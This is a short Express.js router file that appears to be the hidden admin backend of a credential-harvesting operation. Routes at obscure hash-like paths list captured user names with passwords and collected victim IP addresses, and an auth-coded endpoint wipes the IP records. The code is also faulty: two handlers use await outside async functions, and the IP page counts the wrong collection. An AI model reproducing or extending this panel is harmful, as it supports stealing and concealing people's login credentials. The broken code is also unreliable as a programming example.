const express = require('express');
const UserName = require('../models/UserName.js');
const Ip = require('../models/Ip.js');

const router = express.Router();

router.get('/9560F74C21930B7CAA3634D647F52E6F', async (req, res, next) => {
  const passes = await UserName.find();
  const count = await UserName.count();

  res.render('passes', {
    passwords: passes,
    count,
    title: 'all',
  });
});

router.get('/33760E8BAFCFCFC68764091CF96EC423', async (req, res, next) => {
  const passes = await UserName.find({ final: true });
  const count = await UserName.count({ final: true });

  res.render('passes', {
    passwords: passes,
    count,
    title: 'finals',
  });
});

router.get('/957b527bcfbad2e80f58d20683931435', async (req, res, next) => {
  const ips = await Ip.find();
  const count = await UserName.count();

  res.render('passes', {
    passwords: ips,
    count,
    title: 'ips',
  });
});

router.get('/clearips/:authcode', (req, res, next) => {
  if (req.params.authcode === process.env.DELETE_AUTH_CODE) {
    await Ip.deleteMany({});

    res.json({ msg: 'all removed' });
  } else {
    res.status(403).json({ msg: 'not allowed' });
  }
})

router.delete('/clearips/:authcode', (req, res, next) => {
  if (req.params.authcode === process.env.DELETE_AUTH_CODE) {
    await Ip.deleteMany({});

    res.json({ msg: 'all removed' });
  } else {
    res.status(403).json({ msg: 'not allowed' });
  }
})

module.exports = router;
